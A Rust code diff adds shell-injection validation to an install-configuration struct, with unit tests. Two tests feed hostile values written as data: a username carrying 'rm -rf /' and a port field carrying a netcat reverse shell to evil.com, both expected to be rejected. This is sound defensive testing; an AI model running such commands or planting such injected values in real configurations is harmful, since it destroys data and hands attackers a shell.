@@ -418,6 +418,152 @@ pub struct InjectConfig {
     pub distro: Option<Distro>,
 }
 
+impl InjectConfig {
+    /// Validate structured fields to prevent shell injection in late-commands.
+    /// Fields like `run_commands` and `extra_late_commands` are intentional
+    /// escape hatches and are NOT validated here.
+    pub fn validate(&self) -> EngineResult<()> {
+        // Regex-like check: only allow safe characters in structured fields.
+        fn is_safe_identifier(s: &str, field: &str) -> EngineResult<()> {
+            if s.is_empty() {
+                return Ok(());
+            }
+            if s.chars()
+                .all(|c| c.is_alphanumeric() || matches!(c, '-' | '_' | '.'))
+            {
+                Ok(())
+            } else {
+                Err(EngineError::InvalidConfig(format!(
+                    "{field} contains unsafe characters: {s:?} (only alphanumeric, dash, underscore, dot allowed)"
+                )))
+            }
+        }
+
+        fn is_safe_path(s: &str, field: &str) -> EngineResult<()> {
+            if s.is_empty() {
+                return Ok(());
+            }
+            if s.chars()
+                .all(|c| c.is_alphanumeric() || matches!(c, '/' | '-' | '_' | '.' | '+'))
+            {
+                Ok(())
+            } else {
+                Err(EngineError::InvalidConfig(format!(
+                    "{field} contains unsafe characters: {s:?}"
+                )))
+            }
+        }
+
+        fn is_safe_port(s: &str, field: &str) -> EngineResult<()> {
+            // Accept "22", "22/tcp", "80:443/tcp", or named services like "ssh"
+            if s.is_empty() {
+                return Ok(());
+            }
+            if s.chars()
+                .all(|c| c.is_alphanumeric() || matches!(c, '/' | ':'))
+            {
+                Ok(())
+            } else {
+                Err(EngineError::InvalidConfig(format!(
+                    "{field} contains unsafe characters: {s:?}"
+                )))
+            }
+        }
+
+        if let Some(h) = &self.hostname {
+            is_safe_identifier(h, "hostname")?;
+        }
+        if let Some(u) = &self.username {
+            is_safe_identifier(u, "username")?;
+        }
+        if let Some(r) = &self.realname {
+            // Realname can contain spaces
+            if r.chars()
+                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
+            {
+                return Err(EngineError::InvalidConfig(format!(
+                    "realname contains shell metacharacters: {r:?}"
+                )));
+            }
+        }
+
+        // SSH
+        if let Some(true) = self.ssh.allow_password_auth {
+            // fine
+        }
+
+        // User config
+        for g in &self.user.groups {
+            is_safe_identifier(g, "group")?;
+        }
+        if let Some(shell) = &self.user.shell {
+            is_safe_path(shell, "shell")?;
+        }
+
+        // Services
+        for svc in &self.enable_services {
+            is_safe_identifier(svc, "enable_service")?;
+        }
+        for svc in &self.disable_services {
+            is_safe_identifier(svc, "disable_service")?;
+        }
+
+        // Firewall
+        if let Some(policy) = &self.firewall.default_policy {
+            is_safe_identifier(policy, "firewall_policy")?;
+        }
+        for port in &self.firewall.allow_ports {
+            is_safe_port(port, "allow_port")?;
+        }
+        for port in &self.firewall.deny_ports {
+            is_safe_port(port, "deny_port")?;
+        }
+
+        // Sysctl keys
+        for (key, val) in &self.sysctl {
+            is_safe_identifier(key, "sysctl key")?;
+            // Sysctl values can be numeric or simple strings
+            if val
+                .chars()
+                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '"' | '\\' | '\n'))
+            {
+                return Err(EngineError::InvalidConfig(format!(
+                    "sysctl value contains shell metacharacters: {val:?}"
+                )));
+            }
+        }
+
+        // Container users
+        for u in &self.containers.docker_users {
+            is_safe_identifier(u, "docker_user")?;
+        }
+
+        // Swap filename
+        if let Some(swap) = &self.swap {
+            if let Some(fname) = &swap.filename {
+                is_safe_path(fname, "swap_filename")?;
+            }
+        }
+
+        // GRUB
+        if let Some(entry) = &self.grub.default_entry {
+            is_safe_identifier(entry, "grub_default")?;
+        }
+        for param in &self.grub.cmdline_extra {
+            if param
+                .chars()
+                .any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '\'' | '\\' | '\n'))
+            {
+                return Err(EngineError::InvalidConfig(format!(
+                    "grub_cmdline contains shell metacharacters: {param:?}"
+                )));
+            }
+        }
+
+        Ok(())
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -444,6 +590,46 @@ mod tests {
         };
 
         assert!(cfg.validate().is_err());
+    }
+
+    #[test]
+    fn inject_rejects_shell_metachar_in_username() {
+        let cfg = InjectConfig {
+            username: Some("admin; rm -rf /".into()),
+            ..Default::default()
+        };
+        assert!(cfg.validate().is_err());
+    }
+
+    #[test]
+    fn inject_rejects_shell_metachar_in_port() {
+        let cfg = InjectConfig {
+            firewall: FirewallConfig {
+                allow_ports: vec!["22; nc -e /bin/sh evil.com".into()],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert!(cfg.validate().is_err());
+    }
+
+    #[test]
+    fn inject_accepts_valid_fields() {
+        let cfg = InjectConfig {
+            hostname: Some("web-server.lab".into()),
+            username: Some("admin".into()),
+            user: UserConfig {
+                groups: vec!["docker".into(), "sudo".into()],
+                ..Default::default()
+            },
+            firewall: FirewallConfig {
+                allow_ports: vec!["22/tcp".into(), "80:443/tcp".into()],
+                ..Default::default()
+            },
+            enable_services: vec!["sshd".into(), "docker.service".into()],
+            ..Default::default()
+        };
+        assert!(cfg.validate().is_ok());
     }
 
     #[test]
